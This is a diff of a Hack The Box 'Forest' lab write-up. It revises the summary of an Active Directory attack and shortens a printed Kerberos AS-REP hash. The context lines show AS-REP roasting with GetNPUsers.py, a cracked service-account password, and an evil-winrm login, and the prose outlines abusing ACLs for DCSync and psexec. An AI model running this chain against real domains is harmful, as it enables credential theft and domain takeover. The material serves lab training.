@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Forest - Hack The Box
-excerpt: "Forest is a nice easy box that go over some Active Directory vulnerabilities such as pre-authentication not enabled which allows an attacker to crack a user's hash offline, as well as ACLs abuse which we leverage in this case to give ourselves DCsync rights on the domain. I used Bloodhound with aclpwn to automate the attack path."
+excerpt: "Forest is a nice easy box that go over two Active Directory misconfigurations / vulnerabilities: Kerberos Pre-Authentication (disabled) and ACLs misconfiguration. After I retrieve and cracked the hash for the service account I used aclpwn to automate the attack path and give myself DCsync rights to the domain."
 date: 2020-03-21
 classes: wide
 header:
@@ -20,11 +20,11 @@ tags:
 
 ![](/assets/images/htb-writeup-forest/forest_logo.png)
 
-Forest is a nice easy box that go over some Active Directory vulnerabilities such as pre-authentication not enabled which allows an attacker to crack a user's hash offline, as well as ACLs abuse which we leverage in this case to give ourselves DCsync rights on the domain. I used Bloodhound with aclpwn to automate the attack path.
+Forest is a nice easy box that go over two Active Directory misconfigurations / vulnerabilities: Kerberos Pre-Authentication (disabled) and ACLs misconfiguration. After I retrieve and cracked the hash for the service account I used aclpwn to automate the attack path and give myself DCsync rights to the domain.
 
 ## Summary
 
-- The service account `svc-alfresco` does not require kerberos preauthentication so we can retrieve and crack the hash
+- The service account `svc-alfresco` does not require kerberos preauthentication so we can retrieve and crack the hash offline  
 - After running Bloodhound on the machine, we find that we have WriteDACL access on the domain
 - We can give ourselved DCSync rights, recover the administrator NTLM hash and psexec to get an administrator shell
 
@@ -113,7 +113,7 @@ root@kali:~/htb/forest# GetNPUsers.py htb.local/svc-alfresco -no-pass -dc-ip 10.
 Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
 
 [*] Getting TGT for svc-alfresco
-$krb5asrep$23$svc-alfresco@HTB.LOCAL:048f9eeb67ab94be9e4d8fa1da102098$975dae91ab6bf999d089833fd963b22968502904051705806641f10feca002d1304d0c9911ba74e8038ffa90d073b8ea11d1a3c0c9a022baba3414b205e6c89d27fbfd2c28be57e1ca5320aabb44d5b6bb0495bf4824f31ce4ce940406a3ad6795798814af93e6ab7b86dd49ae84dfd0e20c18bbff4e7a1f6828057f40e212e6fec3dbc3fd10b340cefc3d7969fa06caef0e8b057b8ba994b41771536fc57f5dcce3c8e8e05e1953e3dd4e1ca7bd4a1b80bb1e13d20289256d31f2ca596b12c86e3e7389a8a6bd06816fbcf6994e733284cc75dc1e3fff447a5d69b064df4fc5967c96b023a5
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:048f9eeb67ab94be9e4d8fa1da1020[...]6994e733284cc75dc1e3fff447a5d69b064df4fc5967c96b023a5
 ```
 
 ```
@@ -128,7 +128,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 ```
 
-We found the credentials for the service account: `svc-alfresco` / `s3rvice`. The service account is also able to connect to the server through WinRM.
+We found the credentials for the service account: `svc-alfresco` / `s3rvice`. This service account is allowed to connect to the server with WinRM.
 
 ```
 root@kali:~/htb/forest# evil-winrm -u svc-alfresco -p s3rvice -i 10.10.10.161
